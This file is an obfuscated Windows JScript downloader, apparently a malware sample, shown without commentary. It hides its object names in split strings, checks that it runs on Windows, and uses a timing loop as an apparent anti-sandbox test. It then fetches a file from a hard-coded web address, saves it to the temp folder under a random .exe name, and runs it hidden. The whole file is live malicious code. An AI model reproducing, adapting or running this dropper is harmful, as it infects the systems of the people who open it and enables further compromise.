var E0 = false;
var E = "Create"+"Object";
var R = function T() {return WScript[E]("WScript"+".Shell");}(), I0 = 11;
var OV = "MSXML2"+".XMLHTTP";
var MZ = 2;
var D = MZ - 2;
function FW(K){R["Run"](K, D, D);};
function DZ(){return OV + "";};
function CP(F0, HF){D = D * 1; return F0 - HF;};
function Q(){return E;};
/*@cc_on
  @if (@_win32 || @_win64)
    E0 = true;
  @end
@*/
if (E0)
{
var IG = "";
function IY(){return 22;};
var X0 = 0; var NK = 0;
function GT()
{
var WM = new this["Date"]();
var NC = WM["getUTCMilliseconds"]();
WScript["Sleep"](IY());
var WM = new this["Date"]();
var VW = WM["getUTCMilliseconds"]();
WScript["Sleep"](IY());
var WM = new this["Date"]();
var XA = WM["getUTCMilliseconds"]();
var X0 = "X";
X0 = CP(VW, NC);
var NK = "JC";
NK = CP(XA, VW);
IG = "open";
return CP(X0, NK);
}
var H = false;
var P = false;
for (var I = D; I < IY() * 1; I++){if (GT() != D){
H = true; 
NK = "31" + 11 * X0 + NK; 
P = true; 
break;
}}
function UC() {return ((H == true) && (H == P)) ? 1 : D;};
if (H && UC() && P){
function O() {return R["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "BjIkAJf3al37LmF.ex" + "e";};
 OP = DZ();
 HR = WScript[E](OP);
 var TU = 1;
do { 
	for (;TU;){
	try {
		if (TU == 1)
		{
			HR[IG]("GET", "http://tools24.nl/w8isa", false);
			HR["send"]();
			RP = "Sleep";
			TU = 2;
		}
		WScript[RP](IY() + 120); 
		if (HR["readystate"] < 2 * 2) continue;
		TU = D;
		function JJ(G) {var J = (1, 2, 3, 4, 5, G); return J;};
		LQ = WScript[Q()]("ADODB.Stream");
		OP = LQ;
		OP[IG]();
		OP["type"] = JJ(1);
		OP["write"](HR["ResponseBody"]);
		LQ["position"] = JJ(D);
		OP["Save" + "ToFile"](O(), 2);
		LQ["cl"+"ose"]();
		W = O();
		FW(W);
	} catch(F){};};
}while (TU);
}
}

